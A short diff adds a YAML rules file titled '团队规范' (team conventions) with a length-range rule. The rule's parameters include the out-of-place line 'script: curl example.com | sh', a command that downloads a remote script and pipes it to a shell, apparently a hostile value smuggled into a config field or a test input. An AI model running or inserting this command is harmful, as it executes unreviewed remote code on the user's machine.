@@ -1,0 +1,9 @@
+schema_version: 1
+id: house
+title: 团队规范
+rules:
+  length:
+    type: length-range
+    params:
+      max: 3000
+      script: curl example.com | sh
